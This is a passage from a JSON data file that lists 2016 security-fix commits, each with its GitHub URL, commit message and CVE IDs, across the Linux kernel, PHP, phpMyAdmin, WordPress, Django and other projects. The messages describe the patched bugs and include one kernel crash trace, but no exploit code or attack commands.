    "title": "[media] videobuf2-v4l2: Verify planes array in buffer dequeueing",
    "body": "When a buffer is being dequeued using VIDIOC_DQBUF IOCTL, the exact bufferwhich will be dequeued is not known until the buffer has been removed fromthe queue. The number of planes is specific to a buffer, not to the queue.This does lead to the situation where multi-plane buffers may be requestedand queued with n planes, but VIDIOC_DQBUF IOCTL may be passed an argumentstruct with fewer planes.__fill_v4l2_buffer() however uses the number of planes from the dequeuedvideobuf2 buffer, overwriting kernel memory (the m.planes array allocatedin video_usercopy() in v4l2-ioctl.c) if the user provided fewerplanes than the dequeued buffer had. Oops!Fixes: b0e0e1f (\"[media] media: videobuf2: Prepare to divide videobuf2\")Signed-off-by: Sakari Ailus <sakari.ailus@linux.intel.com>Acked-by: Hans Verkuil <hans.verkuil@cisco.com>Cc: stable@vger.kernel.org # for v4.4 and laterSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>",
    "cveIds": [
      "CVE-2016-4568"
    ],
    "cveIdsCount": 1
  },
  "ad6e564227b4e41fe0a56624196521264acd6668ad77fc7b2d76011c2cd8b7ef": {
    "url": "https://github.com/torvalds/linux/commit/cec8f96e49d9be372fdb0c3836dcf31ec71e457e",
    "title": "ALSA: timer: Fix leak in SNDRV_TIMER_IOCTL_PARAMS",
    "body": "The stack object “tread” has a total size of 32 bytes. Its field“event” and “val” both contain 4 bytes padding. These 8 bytespadding bytes are sent to user without being initialized.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2016-4569"
    ],
    "cveIdsCount": 1
  },
  "20780df8876e53e0df629822d8a61215e26479d1d4f9114e237d6e20a10ecaf3": {
    "url": "https://github.com/torvalds/linux/commit/9a47e9cff994f37f7f0dbd9ae23740d0f64f9fe6",
    "title": "ALSA: timer: Fix leak in events via snd_timer_user_ccallback",
    "body": "The stack object “r1” has a total size of 32 bytes. Its field“event” and “val” both contain 4 bytes padding. These 8 bytespadding bytes are sent to user without being initialized.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2016-4578"
    ],
    "cveIdsCount": 1
  },
  "bd580a78ee052fb946cf7faaad06266ad4826bbd400f0d9dfb982fb094b7585e": {
    "url": "https://github.com/torvalds/linux/commit/e4ec8cc8039a7063e24204299b462bd1383184a5",
    "title": "ALSA: timer: Fix leak in events via snd_timer_user_tinterrupt",
    "body": "The stack object “r1” has a total size of 32 bytes. Its field“event” and “val” both contain 4 bytes padding. These 8 bytespadding bytes are sent to user without being initialized.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2016-4578"
    ],
    "cveIdsCount": 1
  },
  "5af4ba2b68c0cae4ac06c27d9264a33ae24e160e5b91a7595d38553109920ecb": {
    "url": "https://github.com/torvalds/linux/commit/79e48650320e6fba48369fccf13fd045315b19b8",
    "title": "net: fix a kernel infoleak in x25 module",
    "body": "Stack object \"dte_facilities\" is allocated in x25_rx_call_request(),which is supposed to be initialized in x25_negotiate_facilities.However, 5 fields (8 bytes in total) are not initialized. Thisobject is then copied to userland via copy_to_user, thus infoleakoccurs.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-4580"
    ],
    "cveIdsCount": 1
  },
  "f9381bcc049cfd402cb2de766a39ca01fd83f28721c2a509a1083c0b3c3bc95c": {
    "url": "https://github.com/uclouvain/openjpeg/commit/162f6199c0cd3ec1c6c6dc65e41b2faab92b2d91",
    "title": "Fix Heap Buffer Overflow in function color_cmyk_to_rgb",
    "body": "Fix #774",
    "cveIds": [
      "CVE-2016-4796"
    ],
    "cveIdsCount": 1
  },
  "35b23dc65e78498062088480b46aeae8d5b3612411c3b8c25b9d1d5e0f1efe26": {
    "url": "https://github.com/dosfstools/dosfstools/commit/e8eff147e9da1185f9afd5b25948153a3b97cf52",
    "title": "read_boot(): Handle excessive FAT size specifications",
    "body": "The variable used for storing the FAT size (in bytes) was an unsignedint. Since the size in sectors read from the BPB was not sufficientlychecked, this could end up being zero after multiplying it with thesector size while some offsets still stayed excessive. Ultimately itwould cause segfaults when accessing FAT entries for which no memorywas allocated.Make it more robust by changing the types used to store FAT size tooff_t and abort if there is no room for data clusters. Additionallycheck that FAT size is not specified as zero.Fixes #25 and fixes #26.Reported-by: Hanno BöckSigned-off-by: Andreas Bombe <aeb@debian.org>",
    "cveIds": [
      "CVE-2016-4804"
    ],
    "cveIdsCount": 1
  },
  "82c7191c26ed2924fbbc87c467603a63bc2ecea13fd97a7772bef58326181185": {
    "url": "https://github.com/torvalds/linux/commit/1f461dcdd296eecedaffffc6bae2bfa90bd7eb89",
    "title": "ppp: take reference on channels netns",
    "body": "Let channels hold a reference on their network namespace.Some channel types, like ppp_async and ppp_synctty, can have theiruserspace controller running in a different namespace. Therefore theycan't rely on them to preclude their netns from being removed fromunder them.==================================================================BUG: KASAN: use-after-free in ppp_unregister_channel+0x372/0x3a0 ataddr ffff880064e217e0Read of size 8 by task syz-executor/11581=============================================================================BUG net_namespace (Not tainted): kasan: bad access detected-----------------------------------------------------------------------------Disabling lock debugging due to kernel taintINFO: Allocated in copy_net_ns+0x6b/0x1a0 age=92569 cpu=3 pid=6906[< none >] ___slab_alloc+0x4c7/0x500 kernel/mm/slub.c:2440[< none >] __slab_alloc+0x4c/0x90 kernel/mm/slub.c:2469[< inline >] slab_alloc_node kernel/mm/slub.c:2532[< inline >] slab_alloc kernel/mm/slub.c:2574[< none >] kmem_cache_alloc+0x23a/0x2b0 kernel/mm/slub.c:2579[< inline >] kmem_cache_zalloc kernel/include/linux/slab.h:597[< inline >] net_alloc kernel/net/core/net_namespace.c:325[< none >] copy_net_ns+0x6b/0x1a0 kernel/net/core/net_namespace.c:360[< none >] create_new_namespaces+0x2f6/0x610 kernel/kernel/nsproxy.c:95[< none >] copy_namespaces+0x297/0x320 kernel/kernel/nsproxy.c:150[< none >] copy_process.part.35+0x1bf4/0x5760 kernel/kernel/fork.c:1451[< inline >] copy_process kernel/kernel/fork.c:1274[< none >] _do_fork+0x1bc/0xcb0 kernel/kernel/fork.c:1723[< inline >] SYSC_clone kernel/kernel/fork.c:1832[< none >] SyS_clone+0x37/0x50 kernel/kernel/fork.c:1826[< none >] entry_SYSCALL_64_fastpath+0x16/0x7a kernel/arch/x86/entry/entry_64.S:185INFO: Freed in net_drop_ns+0x67/0x80 age=575 cpu=2 pid=2631[< none >] __slab_free+0x1fc/0x320 kernel/mm/slub.c:2650[< inline >] slab_free kernel/mm/slub.c:2805[< none >] kmem_cache_free+0x2a0/0x330 kernel/mm/slub.c:2814[< inline >] net_free kernel/net/core/net_namespace.c:341[< none >] net_drop_ns+0x67/0x80 kernel/net/core/net_namespace.c:348[< none >] cleanup_net+0x4e5/0x600 kernel/net/core/net_namespace.c:448[< none >] process_one_work+0x794/0x1440 kernel/kernel/workqueue.c:2036[< none >] worker_thread+0xdb/0xfc0 kernel/kernel/workqueue.c:2170[< none >] kthread+0x23f/0x2d0 kernel/drivers/block/aoe/aoecmd.c:1303[< none >] ret_from_fork+0x3f/0x70 kernel/arch/x86/entry/entry_64.S:468INFO: Slab 0xffffea0001938800 objects=3 used=0 fp=0xffff880064e20000flags=0x5fffc0000004080INFO: Object 0xffff880064e20000 @offset=0 fp=0xffff880064e24200CPU: 1 PID: 11581 Comm: syz-executor Tainted: G B 4.4.0+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOSrel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014 00000000ffffffff ffff8800662c7790 ffffffff8292049d ffff88003e36a300 ffff880064e20000 ffff880064e20000 ffff8800662c77c0 ffffffff816f2054 ffff88003e36a300 ffffea0001938800 ffff880064e20000 0000000000000000Call Trace: [< inline >] __dump_stack kernel/lib/dump_stack.c:15 [<ffffffff8292049d>] dump_stack+0x6f/0xa2 kernel/lib/dump_stack.c:50 [<ffffffff816f2054>] print_trailer+0xf4/0x150 kernel/mm/slub.c:654 [<ffffffff816f875f>] object_err+0x2f/0x40 kernel/mm/slub.c:661 [< inline >] print_address_description kernel/mm/kasan/report.c:138 [<ffffffff816fb0c5>] kasan_report_error+0x215/0x530 kernel/mm/kasan/report.c:236 [< inline >] kasan_report kernel/mm/kasan/report.c:259 [<ffffffff816fb4de>] __asan_report_load8_noabort+0x3e/0x40 kernel/mm/kasan/report.c:280 [< inline >] ? ppp_pernet kernel/include/linux/compiler.h:218 [<ffffffff83ad71b2>] ? ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392 [< inline >] ppp_pernet kernel/include/linux/compiler.h:218 [<ffffffff83ad71b2>] ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392 [< inline >] ? ppp_pernet kernel/drivers/net/ppp/ppp_generic.c:293 [<ffffffff83ad6f26>] ? ppp_unregister_channel+0xe6/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392 [<ffffffff83ae18f3>] ppp_asynctty_close+0xa3/0x130 kernel/drivers/net/ppp/ppp_async.c:241 [<ffffffff83ae1850>] ? async_lcp_peek+0x5b0/0x5b0 kernel/drivers/net/ppp/ppp_async.c:1000 [<ffffffff82c33239>] tty_ldisc_close.isra.1+0x99/0xe0 kernel/drivers/tty/tty_ldisc.c:478 [<ffffffff82c332c0>] tty_ldisc_kill+0x40/0x170 kernel/drivers/tty/tty_ldisc.c:744 [<ffffffff82c34943>] tty_ldisc_release+0x1b3/0x260 kernel/drivers/tty/tty_ldisc.c:772 [<ffffffff82c1ef21>] tty_release+0xac1/0x13e0 kernel/drivers/tty/tty_io.c:1901 [<ffffffff82c1e460>] ? release_tty+0x320/0x320 kernel/drivers/tty/tty_io.c:1688 [<ffffffff8174de36>] __fput+0x236/0x780 kernel/fs/file_table.c:208 [<ffffffff8174e405>] ____fput+0x15/0x20 kernel/fs/file_table.c:244 [<ffffffff813595ab>] task_work_run+0x16b/0x200 kernel/kernel/task_work.c:115 [< inline >] exit_task_work kernel/include/linux/task_work.h:21 [<ffffffff81307105>] do_exit+0x8b5/0x2c60 kernel/kernel/exit.c:750 [<ffffffff813fdd20>] ? debug_check_no_locks_freed+0x290/0x290 kernel/kernel/locking/lockdep.c:4123 [<ffffffff81306850>] ? mm_update_next_owner+0x6f0/0x6f0 kernel/kernel/exit.c:357 [<ffffffff813215e6>] ? __dequeue_signal+0x136/0x470 kernel/kernel/signal.c:550 [<ffffffff8132067b>] ? recalc_sigpending_tsk+0x13b/0x180 kernel/kernel/signal.c:145 [<ffffffff81309628>] do_group_exit+0x108/0x330 kernel/kernel/exit.c:880 [<ffffffff8132b9d4>] get_signal+0x5e4/0x14f0 kernel/kernel/signal.c:2307 [< inline >] ? kretprobe_table_lock kernel/kernel/kprobes.c:1113 [<ffffffff8151d355>] ? kprobe_flush_task+0xb5/0x450 kernel/kernel/kprobes.c:1158 [<ffffffff8115f7d3>] do_signal+0x83/0x1c90 kernel/arch/x86/kernel/signal.c:712 [<ffffffff8151d2a0>] ? recycle_rp_inst+0x310/0x310 kernel/include/linux/list.h:655 [<ffffffff8115f750>] ? setup_sigcontext+0x780/0x780 kernel/arch/x86/kernel/signal.c:165 [<ffffffff81380864>] ? finish_task_switch+0x424/0x5f0 kernel/kernel/sched/core.c:2692 [< inline >] ? finish_lock_switch kernel/kernel/sched/sched.h:1099 [<ffffffff81380560>] ? finish_task_switch+0x120/0x5f0 kernel/kernel/sched/core.c:2678 [< inline >] ? context_switch kernel/kernel/sched/core.c:2807 [<ffffffff85d794e9>] ? __schedule+0x919/0x1bd0 kernel/kernel/sched/core.c:3283 [<ffffffff81003901>] exit_to_usermode_loop+0xf1/0x1a0 kernel/arch/x86/entry/common.c:247 [< inline >] prepare_exit_to_usermode kernel/arch/x86/entry/common.c:282 [<ffffffff810062ef>] syscall_return_slowpath+0x19f/0x210 kernel/arch/x86/entry/common.c:344 [<ffffffff85d88022>] int_ret_from_sys_call+0x25/0x9f kernel/arch/x86/entry/entry_64.S:281Memory state around the buggy address: ffff880064e21680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ffff880064e21700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb>ffff880064e21780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ^ ffff880064e21800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ffff880064e21880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb==================================================================Fixes: 273ec51 (\"net: ppp_generic - introduce net-namespace functionality v2\")Reported-by: Baozeng Ding <sploving1@gmail.com>Signed-off-by: Guillaume Nault <g.nault@alphalink.fr>Reviewed-by: Cyrill Gorcunov <gorcunov@openvz.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-4805"
    ],
    "cveIdsCount": 1
  },
  "3965cec533784d9272d40cf34b2a71c633fa7187fefd00ef1cd6e5f79bbbb3d5": {
    "url": "https://github.com/ossec/ossec-wui/commit/b4dcbba7a8eb09ba9d38fc69807a8861255736d0",
    "title": "Unanchored regex would allow badness through. This patch eliminates a",
    "body": "XSS identified by JPCERT Reference number: JVN#58455472",
    "cveIds": [
      "CVE-2016-4847"
    ],
    "cveIdsCount": 1
  },
  "8b84feb94fea8c2beb3ce0d815e307c70303266b8c99c8935a3323802385a28e": {
    "url": "https://github.com/torvalds/linux/commit/99d825822eade8d827a1817357cbf3f889a552d6",
    "title": "get_rock_ridge_filename(): handle malformed NM entries",
    "body": "Payloads of NM entries are not supposed to contain NUL. When we runinto such, only the part prior to the first NUL goes into theconcatenation (i.e. the directory entry name being encoded by a bunchof NM entries). We do stop when the amount collected so far + theclaimed amount in the current NM entry exceed 254. So far, so good,but what we return as the total length is the sum of *claimed*sizes, not the actual amount collected. And that can grow prettylarge - not unlimited, since you'd need to put CE entries inbetween to be able to get more than the maximum that could becontained in one isofs directory entry / continuation chunk andwe are stop once we'd encountered 32 CEs, but you can get about 8Kbeasily. And that's what will be passed to readdir callback as thename length. 8Kb __copy_to_user() from a buffer allocated by__get_free_page()Cc: stable@vger.kernel.org # 0.98pl6+ (yes, really)Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>",
    "cveIds": [
      "CVE-2016-4913"
    ],
    "cveIdsCount": 1
  },
  "e6d5b8daa96408822478289907dbd5b8c028b8ba0e64ec1355e3f7461e47948f": {
    "url": "https://github.com/torvalds/linux/commit/ce683e5f9d045e5d67d1312a42b359cb2ab2a13c",
    "title": "netfilter: x_tables: check for bogus target offset",
    "body": "We're currently asserting that targetoff + targetsize <= nextoff.Extend it to also check that targetoff is >= sizeof(xt_entry).Since this is generic code, add an argument pointing to the start of thematch/target, we can then derive the base structure size from the delta.We also need the e->elems pointer in a followup change to validate matches.Signed-off-by: Florian Westphal <fw@strlen.de>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2016-4997"
    ],
    "cveIdsCount": 1
  },
  "df1246452c3edc43af438c6d2784f4dc9ba9605a35b7a463549f00c7665741a0": {
    "url": "https://github.com/torvalds/linux/commit/6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91",
    "title": "netfilter: x_tables: make sure e->next_offset covers remaining blob size",
    "body": "Otherwise this function may read data beyond the ruleset blob.Signed-off-by: Florian Westphal <fw@strlen.de>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2016-4998"
    ],
    "cveIdsCount": 1
  },
  "97af609fc1569ab68246eaa88800d0a934f29173ce7694c6cb41586c5960cd4f": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/8716855b309dbe65d7b9a5d681b80579b225b322",
    "title": "Properly escape translated string",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5733"
    ],
    "cveIdsCount": 1
  },
  "0ad5d982137c83ed5a4ddb53af7bbb4b5c7fe0439f764cdd66a489bfdc8429c0": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/895a131d2eb7e447757a35d5731c7d647823ea8b",
    "title": "Escape HTML when rendering AJAX error",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5733"
    ],
    "cveIdsCount": 1
  },
  "db7f623bdaa552a74c914bac20024bdf59d60d202e970cc580cc2095f03f0cf0": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/79661610f6f65443e0ec1e382a7240437f28436c",
    "title": "Escape attributes when showing images in javascript",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5733"
    ],
    "cveIdsCount": 1
  },
  "b8c8fda4332e3f3d5a739b077293c54b5f77ac37cfd0cc40c9f7a62e9c41b8cb": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/1cc7466db3a05e95fe57a6702f41773e6829d54b",
    "title": "Quote delimiter before using preg_replace",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5734"
    ],
    "cveIdsCount": 1
  },
  "b7547ece52f9ddeffe9b2c0f5682db244eef21b9039d30b4fc4cefcf96b8db02": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/4bcc606225f15bac0b07780e74f667f6ac283da7",
    "title": "Always use delimiter not present in search expression",
    "body": "This avoids need to figure out correct escaping in case delimiter ispresent in the expression.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5734"
    ],
    "cveIdsCount": 1
  },
  "ca5efbd532b512c182888da8bc9437335fa6d79d513a8b3b51af1d6daa71c753": {
    "url": "https://github.com/pornel/pngquant/commit/b7c217680cda02dddced245d237ebe8c383be285",
    "title": "Fix integer overflow in rwpng.h (CVE-2016-5735)",
    "body": "Reported by Choi Jaeseung Found with Sparrow (http://ropas.snu.ac.kr/sparrow)",
    "cveIds": [
      "CVE-2016-5735"
    ],
    "cveIdsCount": 1
  },
  "93f42da6849d661e61e7955368357e534f2346d17f57fa9c38290d5ca9291e0e": {
    "url": "https://github.com/openstack-infra/puppet-gerrit/commit/8573c2ee172f66c1667de49685c88fdc8883ca8b",
    "title": "Remove text/html as a safe mimetype",
    "body": "The non-default safe mimetype in gerrit exists purely to proect installsagainst setting this - when set, downloading a text/html file willresult in that file being rendered.Change-Id: I648ada0b26aaf35ece9ef57f609b46f23f6e422a",
    "cveIds": [
      "CVE-2016-5737"
    ],
    "cveIdsCount": 1
  },
  "6b9eb1f7bb0c6da31cbb810dcf1af23de66e297aecafb3abb43886b93f4e9ec8": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/2f4950828ec241e8cbdcf13090c2582a6fa620cb",
    "title": "Update referrer <meta> to match current standards",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5739"
    ],
    "cveIdsCount": 1
  },
  "a9672f8469a1240d2edfde2665958a7fc749c3a5336912dde00343e57ddc4b07": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/1e5716cb96d46efc305381ae0da08e73fe340f05",
    "title": "Add referrer CSP and <meta> tag",
    "body": "This avoids leaking Referer header in modern browsers.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-5739"
    ],
    "cveIdsCount": 1
  },
  "cfb499b9f392a7ff722a49acd8322f4d6a2672250469389611d6d831bee38bc1": {
    "url": "http://github.com/php/php-src/commit/7722455726bec8c53458a32851d2a87982cf0eac?w=1",
    "title": "Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap ov…",
    "body": "…erflow",
    "cveIds": [
      "CVE-2016-5766"
    ],
    "cveIdsCount": 1
  },
  "55f40d2d03c5be5ce4673cce40cdba822aaaf6016ed4e37230abee3b68addbea": {
    "url": "http://github.com/php/php-src/commit/c395c6e5d7e8df37a21265ff76e48fe75ceb5ae6?w=1",
    "title": "iFixed bug #72446 - Integer Overflow in gdImagePaletteToTrueColor() r…",
    "body": "…esulting in heap overflow",
    "cveIds": [
      "CVE-2016-5767"
    ],
    "cveIdsCount": 1
  },
  "8d04b8337d671eda772dc6324a5f9786ada1e36795dca0a33bc47837cc77c098": {
    "url": "http://github.com/php/php-src/commit/3f627e580acfdaf0595ae3b115b8bec677f203ee?w=1",
    "title": "Fixed ##72433: Use After Free Vulnerability in PHP's GC algorithm and…",
    "body": "… unserialize",
    "cveIds": [
      "CVE-2016-5771"
    ],
    "cveIdsCount": 1
  },
  "cf142c9c60eb0bc1c48d27d63a94b3bd80e0cc67f886ea9372d22cda04c9be61": {
    "url": "http://github.com/php/php-src/commit/f6aef68089221c5ea047d4a74224ee3deead99a6?w=1",
    "title": "Fix bug #72434: ZipArchive class Use After Free Vulnerability in PHP'…",
    "body": "…s GC algorithm and unserialize",
    "cveIds": [
      "CVE-2016-5773"
    ],
    "cveIdsCount": 1
  },
  "3a4b87a0de90adc624e1307a261fde07ed687ec0c5c7734700390ffa4d83ae37": {
    "url": "https://github.com/torvalds/linux/commit/93a2001bdfd5376c3dc2158653034c20392d15c5",
    "title": "HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES com…",
    "body": "…mandsThis patch validates the num_values parameter from userland during theHIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was setto HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameterleading to a heap overflow.Cc: stable@vger.kernel.orgSigned-off-by: Scott Bauer <sbauer@plzdonthack.me>Signed-off-by: Jiri Kosina <jkosina@suse.cz>",
    "cveIds": [
      "CVE-2016-5829"
    ],
    "cveIdsCount": 1
  },
  "8ea8489d5acacdeb5a1749c50fb17add81aa700cdf44af030c281b7d36101a8f": {
    "url": "https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648",
    "title": "Admin: Escape attachment name in case it contains special characters",
    "body": "Built from https://develop.svn.wordpress.org/trunk@37774git-svn-id: http://core.svn.wordpress.org/trunk@37739 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2016-5833",
      "CVE-2016-5834"
    ],
    "cveIdsCount": 2
  },
  "1f83f9b06dc91fb7ec2bc579ba3ff17ac71c346f9601670ff2330dbb324335ed": {
    "url": "https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1",
    "title": "Revisions: Change the capability needed to view revision diffs to `ed…",
    "body": "…it_post`.Built from https://develop.svn.wordpress.org/trunk@37779git-svn-id: http://core.svn.wordpress.org/trunk@37744 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2016-5835"
    ],
    "cveIdsCount": 1
  },
  "553ac5f8572f3c3cd6f81b9a3e420e9e6b2ee088d8a96a29d52b3ccf48a2b60a": {
    "url": "https://github.com/ImageMagick/ImageMagick/commit/d8ab7f046587f2e9f734b687ba7e6e10147c294b",
    "title": "Improve checking of EXIF profile to prevent integer overflow (bug rep…",
    "body": "…ort from Ibrahim el-sayed)",
    "cveIds": [
      "CVE-2016-5841",
      "CVE-2016-5842"
    ],
    "cveIdsCount": 2
  },
  "abf8541c4069477c06ce9a2b35de169e3da4be0acb851177fc33f12e16c5b482": {
    "url": "https://github.com/libarchive/libarchive/commit/3ad08e01b4d253c66ae56414886089684155af22",
    "title": "Issue 717: Fix integer overflow when computing location of volume des…",
    "body": "…criptorThe multiplication here defaulted to 'int' but calculationsof file positions should always use int64_t. A simple castsuffices to fix this since the base location is always 32 bitsfor ISO, so multiplying by the sector size will never overflowa 64-bit integer.",
    "cveIds": [
      "CVE-2016-5844"
    ],
    "cveIdsCount": 1
  },
  "15a33a1c659b743e4b5390ff62e5f68e3cd4b00ec903c21df65c959dfa596c01": {
    "url": "https://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac",
    "title": "fix bug #71719 (Buffer overflow in HTTP url parsing functions)",
    "body": "The parser's offset was not reset when we softfail in schemeparsing and continue to parse a path.Thanks to hlt99 at blinkenshell dot org for the report.",
    "cveIds": [
      "CVE-2016-5873"
    ],
    "cveIdsCount": 1
  },
  "b40db3b943d74ad3b14b16a6eafa5aecb2b47aa15440a480ad457d29e66c455f": {
    "url": "https://github.com/django/django/commit/d03bf6fe4e9bf5b07de62c1a271c4b41a7d3d158",
    "title": "[1.9.x] Fixed XSS in admin's add/change related popup.",
    "body": "This is a security fix.",
    "cveIds": [
      "CVE-2016-6186"
    ],
    "cveIdsCount": 1
  },
  "afb1417425d0329f153c852d21644ededec3e322bf8b298c74d4da0a7770e823": {
    "url": "https://github.com/django/django/commit/f68e5a99164867ab0e071a936470958ed867479d",
    "title": "[1.8.x] Fixed XSS in admin's add/change related popup.",
    "body": "This is a security fix.",
    "cveIds": [
      "CVE-2016-6186"
    ],
    "cveIdsCount": 1
  },
  "a49e5d1f4adf21e6cb039554262f5e25daec004e19b5011f111e78a031920471": {
    "url": "https://github.com/torvalds/linux/commit/30a46a4647fd1df9cf52e43bf467f0d9265096ca",
    "title": "apparmor: fix oops, validate buffer size in apparmor_setprocattr()",
    "body": "When proc_pid_attr_write() was changed to use memdup_user apparmor's(interface violating) assumption that the setprocattr buffer was alwaysa single page was violated.The size test is not strictly speaking needed as proc_pid_attr_write()will reject anything larger, but for the sake of robustness we can keepit in.SMACK and SELinux look safe to me, but somebody else should probablyhave a look just in case.Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>modified for the case that apparmor provides null termination.Fixes: bb646cdReported-by: Vegard Nossum <vegard.nossum@oracle.com>Cc: Al Viro <viro@zeniv.linux.org.uk>Cc: John Johansen <john.johansen@canonical.com>Cc: Paul Moore <paul@paul-moore.com>Cc: Stephen Smalley <sds@tycho.nsa.gov>Cc: Eric Paris <eparis@parisplace.org>Cc: Casey Schaufler <casey@schaufler-ca.com>Cc: stable@kernel.orgSigned-off-by: John Johansen <john.johansen@canonical.com>Reviewed-by: Tyler Hicks <tyhicks@canonical.com>Signed-off-by: James Morris <james.l.morris@oracle.com>",
    "cveIds": [
      "CVE-2016-6187"
    ],
    "cveIdsCount": 1
  },
  "acd167519a88eeded4855586f7f298809adb59ff65ed0c40f2149f97df55ee46": {
    "url": "https://github.com/inverse-inc/sogo/commit/32bb1456e23a32c7f45079c3985bf732dd0d276d",
    "title": "(feat) attachment size upload using WOMaxUploadSize (fixes #3510 and …",
    "body": "…#3135)",
    "cveIds": [
      "CVE-2016-6188"
    ],
    "cveIdsCount": 1
  },
  "366dcdb4e151db664d0fd037d11ecd0bf4a9487d37c2a8164e0920677242451f": {
    "url": "https://github.com/inverse-inc/sogo/commit/875a4aca3218340fd4d3141950c82c2ff45b343d",
    "title": "(fix) improved previous commit for attributes stripping and UID gener…",
    "body": "…ation (fixes #3695 and #3696)",
    "cveIds": [
      "CVE-2016-6190"
    ],
    "cveIdsCount": 1
  },
  "23e7e27cf06593820d145c9f718600a91106935b095344bfec079736fab7098e": {
    "url": "https://github.com/inverse-inc/sogo/commit/717f45f640a2866b76a8984139391fae64339225",
    "title": "(fix) improved previous commit for attributes stripping and UID gener…",
    "body": "…ation (fixes #3695 and #3696)Conflicts:SoObjects/Appointments/SOGoCalendarComponent.m",
    "cveIds": [
      "CVE-2016-6190"
    ],
    "cveIdsCount": 1
  },
  "2a65c8398f0e57724fb0d54326140a6e44715abe7a29a4b338a5af831bb8f235": {
    "url": "https://github.com/inverse-inc/sogo/commit/64ce3c9c22fd9a28caabf11e76216cd53d0245aa",
    "title": "Escape HTML in raw source of events and tasks",
    "body": "Fixes #3718",
    "cveIds": [
      "CVE-2016-6191"
    ],
    "cveIdsCount": 1
  },
  "5075a73883037b1958f75000ba6cf935339d46361f4bfcea5cbc18b1226b4a03": {
    "url": "https://github.com/torvalds/linux/commit/11f3710417d026ea2f4fcf362d866342c5274185",
    "title": "ovl: verify upper dentry before unlink and rename",
    "body": "Unlink and rename in overlayfs checked the upper dentry for staleness byverifying upper->d_parent against upperdir. However the dentry can gostale also by being unhashed, for example.Expand the verification to actually look up the name again (under parentlock) and check if it matches the upper dentry. This matches what the VFSdoes before passing the dentry to filesytem's unlink/rename methods, whichexcludes any inconsistency caused by overlayfs.Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>",
    "cveIds": [
      "CVE-2016-6197"
    ],
    "cveIdsCount": 1
  },
  "52429c3be44b4f8bf2e4a9b6d70d7caaa1dcaf27fd64f5de481c1d4bf090fd87": {
    "url": "https://github.com/libgd/libgd/commit/10ef1dca63d62433fda13309b4a228782db823f7",
    "title": "Unsupported TGA bpp/alphabit combinations should error gracefully",
    "body": "Currently, only 24bpp without alphabits and 32bpp with 8 alphabits arereally supported. All other combinations will be rejected with a warning.",
    "cveIds": [
      "CVE-2016-6214"
    ],
    "cveIdsCount": 1
  },
  "24b9c708e87351c88137a958afb733f03b3033b9bcb95def0f98f4fad03e2d24": {
    "url": "https://github.com/php/php-src/commit/0bfb970f43acd1e81d11be1154805f86655f15d5?w=1",
    "title": "Fix bug #72928 - Out of bound when verify signature of zip phar in ph…",
    "body": "…ar_parse_zipfile(cherry picked from commit 19484ab)",
    "cveIds": [
      "CVE-2016-7414"
    ],
    "cveIdsCount": 1
  },
  "fee8c34ff6face9f32b5211813963cecb339a951c132cf48eacac32e1e06a08e": {
    "url": "https://github.com/nextcloud/gallery/commit/6933d27afe518967bd1b60e6a7eacd88288929fc",
    "title": "Add more escaping",
    "body": "Escape folder names in share.js",
    "cveIds": [
      "CVE-2016-7419"
    ],
    "cveIdsCount": 1
  },
